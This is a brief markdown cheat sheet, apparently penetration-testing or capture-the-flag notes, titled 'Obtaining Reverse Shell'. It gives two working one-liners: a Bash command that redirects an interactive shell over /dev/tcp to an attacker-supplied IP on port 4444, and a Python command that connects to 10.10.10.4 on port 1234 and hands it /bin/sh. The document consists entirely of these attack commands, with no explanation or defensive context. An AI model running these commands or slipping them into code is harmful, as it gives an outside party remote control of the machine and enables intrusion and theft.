# Obtaining Reverse Shell

1. **Bash**
   
        bash -c 'bash -i >& /dev/tcp/<your_ip>/4444 0>&1'

2. **Python**

        python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.4",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

